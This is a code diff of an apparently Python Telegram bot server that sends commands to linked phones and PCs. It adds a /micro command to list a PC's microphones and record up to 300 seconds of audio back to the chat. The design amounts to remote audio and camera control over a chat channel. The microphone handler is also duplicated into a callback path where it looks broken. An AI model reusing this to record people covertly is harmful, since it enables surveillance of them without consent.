@@ -20,6 +20,7 @@ state = {
     "msg_sessions": {},      # chat_id -> {step, mode, questions[], answers[], cur_q, pending_cmd}
     "selected_device": {},   # chat_id -> device_id
     "questions": [],         # глобальный список вопросов опросника
+    "micro_sessions": {},    # chat_id -> {step, dev_id, device_index, device_name}
 }
 
 # Уникальный ID этого запуска сервера — меняется при каждом рестарте
@@ -163,6 +164,17 @@ async def enqueue_command(chat_id: str, dev_id: str, cmd: dict, description: str
 
 # ─── Keyboards ────────────────────────────────────────────────────────────────
 
+def main_keyboard():
+    """Постоянная клавиатура с быстрыми кнопками."""
+    return {
+        "keyboard": [
+            [{"text": "📊 /status"}, {"text": "📱 /devices"}],
+            [{"text": "✅ /on"},     {"text": "❓ /help"}],
+        ],
+        "resize_keyboard": True,
+        "persistent": True,
+    }
+
 def msg_mode_keyboard():
     return {"inline_keyboard": [[
         {"text": "💬 Обычное",   "callback_data": "msg_plain"},
@@ -277,6 +289,24 @@ async def process_callback(callback: dict):
         return
 
     # ── Режим видео (fb mode) ─────────────────────────────────────────────────
+    # ── Микрофон: ожидаем количество секунд ─────────────────────────────────
+    msess = state["micro_sessions"].get(chat_id)
+    if msess and msess.get("step") == "choose_seconds":
+        if not text.isdigit():
+            await send_tg(chat_id, "⚠️ Введи число секунд (1-300)")
+            return
+        seconds = max(1, min(int(text), 300))
+        state["micro_sessions"].pop(chat_id, None)
+        dev_id = msess["dev_id"]
+        device_index = msess["device_index"]
+        device_name = msess["device_name"]
+        await send_tg(chat_id,
+            f"🎙 Записываю *{seconds} сек* с микрофона *{device_name}*...")
+        await enqueue_command(chat_id, dev_id,
+            {"cmd": "record_audio", "seconds": seconds, "device_index": device_index},
+            f"запись микрофона {seconds} сек")
+        return
+
     vsess = state["video_sessions"].get(chat_id)
     if vsess:
         if vsess["step"] == "mode" and data in ("vmsg_plain", "vmsg_reply", "vmsg_survey"):
@@ -330,6 +360,24 @@ async def process_update(update: dict):
         return
 
     # ── Видео: ожидаем duration ───────────────────────────────────────────────
+    # ── Микрофон: ожидаем количество секунд ─────────────────────────────────
+    msess = state["micro_sessions"].get(chat_id)
+    if msess and msess.get("step") == "choose_seconds":
+        if not text.isdigit():
+            await send_tg(chat_id, "⚠️ Введи число секунд (1-300)")
+            return
+        seconds = max(1, min(int(text), 300))
+        state["micro_sessions"].pop(chat_id, None)
+        dev_id = msess["dev_id"]
+        device_index = msess["device_index"]
+        device_name = msess["device_name"]
+        await send_tg(chat_id,
+            f"🎙 Записываю *{seconds} сек* с микрофона *{device_name}*...")
+        await enqueue_command(chat_id, dev_id,
+            {"cmd": "record_audio", "seconds": seconds, "device_index": device_index},
+            f"запись микрофона {seconds} сек")
+        return
+
     vsess = state["video_sessions"].get(chat_id)
     if vsess and vsess["step"] == "duration":
         if not text.isdigit():
@@ -394,8 +442,10 @@ async def process_update(update: dict):
             "/getfiles — открыть галерею на телефоне\n"
             "/camera — открыть камеру на телефоне\n\n"
             "*Прочее:*\n"
-            f"/name <имя> | Имена: {', '.join(VALID_NAMES)}"
-        ))
+            f"/name <имя> | Имена: {', '.join(VALID_NAMES)}\n\n"
+            "*Микрофон:*\n"
+            "/micro <сек> — записать аудио с микрофона ПК"
+        ), reply_markup=main_keyboard())
 
     elif text == "/devices":
         if not devices:
@@ -615,8 +665,20 @@ async def process_update(update: dict):
         if err: await send_tg(chat_id, err)
         else: await enqueue_command(chat_id, dev_id, {"cmd": "open_camera"}, "открыть камеру")
 
+    elif text == "/micro":
+        dev_id, err = require_device(chat_id)
+        if err:
+            await send_tg(chat_id, err)
+        else:
+            # Запрашиваем список микрофонов с ПК
+            state["micro_sessions"][chat_id] = {"step": "waiting_devices", "dev_id": dev_id}
+            await enqueue_command(chat_id, dev_id,
+                {"cmd": "get_audio_devices"},
+                "запрос списка микрофонов")
+            await send_tg(chat_id, "⏳ Запрашиваю список микрофонов...")
+
     else:
-        await send_tg(chat_id, "❓ /help")
+        await send_tg(chat_id, "❓ /help", reply_markup=main_keyboard())
 
 
 # ─── Webhook ──────────────────────────────────────────────────────────────────
@@ -651,6 +713,39 @@ async def upload(
 
     asyncio.create_task(send_tg_file(chat_id, data, filename, caption))
     return {"ok": True, "size": len(data)}
+
+
+# ─── Micro devices endpoint (ПК присылает список микрофонов) ────────────────────
+
+@app.post("/micro_devices")
+async def micro_devices(
+    body: dict,
+    x_device_secret: Optional[str] = Header(None),
+):
+    if x_device_secret != DEVICE_SECRET:
+        raise HTTPException(status_code=403, detail="Forbidden")
+
+    chat_id = body.get("chat_id") or ALLOWED_CHAT_ID
+    devices_list = body.get("devices", [])  # [{index, name}, ...]
+
+    if not chat_id or not devices_list:
+        return {"ok": False}
+
+    # Сохраняем список в сессию
+    sess = state["micro_sessions"].get(chat_id, {})
+    sess["step"] = "choose_device"
+    sess["dev_id"] = body.get("device_id", "")
+    sess["devices_list"] = devices_list
+    state["micro_sessions"][chat_id] = sess
+
+    # Строим inline кнопки с микрофонами
+    rows = []
+    for d in devices_list:
+        rows.append([{"text": f"🎙 {d['name'][:40]}", "callback_data": f"micro_dev:{d['index']}"}])
+    rows.append([{"text": "❌ Отмена", "callback_data": "micro_cancel"}])
+
+    await send_tg(chat_id, "🎙 Выбери микрофон:", reply_markup={"inline_keyboard": rows})
+    return {"ok": True}
 
 
 # ─── Text reply endpoint (Android → TG) ──────────────────────────────────────
